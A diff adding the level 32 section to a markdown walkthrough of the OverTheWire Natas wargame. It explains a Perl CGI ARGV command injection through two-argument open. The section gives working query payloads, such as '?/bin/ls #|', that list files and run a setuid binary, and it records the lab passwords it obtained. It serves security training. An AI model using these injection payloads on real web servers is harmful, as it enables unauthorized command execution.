@@ -611,3 +611,18 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Password for natas32:** `Rc3837d6qd3KoW0R2IgKssMXRX06btgY`
 - **Verification:** `http://natas32.natas.labs.overthewire.org/` with `natas32:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L31.cast`
+
+## Level 32 → natas33
+- **Account:** `natas32`, password `Rc3837d6qd3KoW0R2IgKssMXRX06btgY`.
+- **Goal:** Same CSV2HTML code as natas31, but the page says "This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute."
+- **Technique and why it works:** **ARGV injection, with the CGI quoting wrinkle defused**. The plain `file=ARGV` field again makes `param('file')` the string `ARGV`, so Perl's two-argument `open` reads `@ARGV`, populated by CGI from the query string. The difference from natas31 is that CGI.pm passes each query word through shell-style quoting when it builds `@ARGV`, so a bare `cmd|` reaches Perl as `cmd|\` (a filename ending in a backslash) and does not open a pipe. Ending the query with ` #` fixes this: the `#` comments out the quote/backslash CGI appended, and the `|` stays a pipe operator. That is why the query must be `?/bin/ls #|`.
+
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source.** Identical `upload`/`param('file')`/`while (<$file>)` structure; the goal is code execution to run the webroot binary.
+2. **Get the quoting right.** `?/bin/ls #|` works, while `?/bin/ls|` does not (CGI turns it into a filename). The recording shows the working form and the directory listing: `getpassword`, `index.pl`, `tmp`, ...
+3. **Inspect the target.** `?/bin/ls -la /var/www/natas/natas32/getpassword #|` → `-rwsrwx--- 1 root natas32` — a setuid-root binary that natas32 may execute.
+4. **Execute it.** `?/var/www/natas/natas32/getpassword #|` → `kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL`.
+5. **Verify.** `curl -u natas33:<pw> http://natas33.natas.labs.overthewire.org/` → HTTP 200.
+- **Password for natas33:** `kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL`
+- **Verification:** `http://natas33.natas.labs.overthewire.org/` with `natas33:<password>` → HTTP 200.
+- **Recording:** `recordings/natas/L32.cast`
